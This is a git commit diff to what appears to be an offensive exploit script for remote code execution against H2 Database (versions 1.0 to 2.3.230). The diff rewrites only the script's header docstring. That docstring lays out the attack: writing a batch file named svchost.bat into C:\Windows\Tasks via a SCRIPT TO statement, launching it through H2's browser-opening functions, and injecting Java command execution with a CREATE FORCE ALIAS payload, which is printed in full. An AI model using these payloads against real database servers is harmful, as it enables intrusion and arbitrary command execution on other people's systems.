39020c37160e37d2989222b621cae5ed4a8d679a
ViperXSec <146484902+ViperXSec@users.noreply.github.com>
2024-07-18 14:34:32 -0300

    Update ViperX_H2DB_RCE.py

--- ViperX_H2DB_RCE.py
+++ ViperX_H2DB_RCE.py
@@ -1,18 +1,20 @@
 """
-    H2 Database 0day - ViperX Labs
-    Date: 17/07/2024
+# H2 Database - RCE  
+H2 Database (1.0 ~ 2.3.230) - Remote Code Execution
 
-    The exploit works with the following logic: 
-    ~for versions <(1.4) we create a 'dummy' table, and write the output into a C:\Windows\Tasks\svchost.bat file
-      '-> With this bat file we can perform remote code execution with Arbitrary File Writing vulnerability.
-      '-> for old versions we open the .bat file with "org.h2.util.StartBrowser.openURL" and for the newest one "org.h2.tools.Server.openBrowser"
-    ~ In case of versions >(1.4), we just perform JAVA code inject through 'CREATE ALIAS' function:
-      '->  
-        CREATE FORCE ALIAS CMD_INJECT AS $$
-        void pwshInject() throws Exception {
-            Runtime.getRuntime().exec("%s");
-        }
-        $$;
+H2 Database RCE - ViperX Offensive Security
+  Date: 17/07/2024
+
+The exploit flow operates with the following logic: 
+~ for versions <(1.4) we create a 'dummy' table, and write the output log into a C:\Windows\Tasks\svchost.bat file by using ("SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}')
+  '-> With this bat file we can perform remote code execution with Arbitrary File Writing vulnerability.
+  '-> for old versions we open the .bat file with "org.h2.util.StartBrowser.openURL" and for the newest one "org.h2.tools.Server.openBrowser"
+~ In case of versions >(1.4), we just perform JAVA Code Execution through 'CREATE ALIAS' function:
+  '->  CREATE FORCE ALIAS CMD_INJECT AS $$
+  void pwshInject() throws Exception {
+      Runtime.getRuntime().exec("%s");
+  }
+  $$;
 """
 import requests
 import re
